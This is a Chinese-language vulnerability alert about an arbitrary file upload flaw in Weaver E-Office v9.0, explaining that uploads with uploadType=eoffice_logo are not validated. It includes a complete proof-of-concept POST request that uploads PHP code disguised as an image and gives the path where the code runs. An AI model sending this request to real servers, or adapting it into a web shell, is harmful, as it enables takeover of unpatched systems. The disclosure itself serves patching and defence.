---
source: "MrWQ/vulnerability-paper"
---

# 漏洞预警：某 E-Office v9 被捕获的任意文件上传漏洞分析

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uAhcQ8O1HKHZ6JLZ_pmNzg)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)

**一****：漏洞描述🐑**

  

看朋友圈的时候发现都转发了一条漏洞预警

https://mp.weixin.qq.com/s/P75K_0869h-nWHRMu06zgQ

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MMiaR8fQyEKMFDFKqZUBkEphYbgvDWBTA3BG4PKvbml2BaoW2F8HG29Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)

二:  漏洞影响🐇

  

泛微 e-office v9.0

![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)

三:  漏洞复现🐋

  

  

根据漏洞预警的图片修复描述来看一下源代码

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MUFEuOVicEypveLGwo0pWsbSemToAIll83a8K6153NBIwZ7OQu9s5W1A/640?wx_fmt=png)  

  

存在漏洞的源代码位置，主要是源于 uploadType 参数设为 eoffice_logo 时，对文件没有校验，导致任意文件上传  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MkbOfn9vPE1sTKGgGLicIVibNAibl2vH5GgwOB2GfYVJiafnq8xvN92LS8Q/640?wx_fmt=png)

  

调用方法 uploadPicture

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MgDc5rmJngPYA6AchtTxk2H2fSoJp3QP2icyWWuxQicrwcyG1dRHicwTew/640?wx_fmt=png)

  

构造请求上传文件即可

```
POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
Host: 127.0.0.1:7899
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
Content-Length: 193
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; 
Content-Type: image/jpeg

<?php phpinfo();?>

--e64bdf16c554bbc109cecef6451c26a4--
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MAXYCsbxD8JjNibBmIv4nLYtwOg6A6oQk7l1PHH6SmHyn3NL7jQTCuMQ/640?wx_fmt=png)

  

上传成功后访问 /images/logo/logo-eoffice.php

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MAnsr7GVQe9tqFDRPezT3ribmIRT8xY36fbLonlNiayr4jwJ2mUETC2WQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)

 五:  关于文库🦉

  

  

                    https://www.yuque.com/peiqiwik                           

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7M1sUD3R1Am0JerQ98aaxL4qVEdVxM9YquIrAs2ovlic0sTp2KXdrvEnQ/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
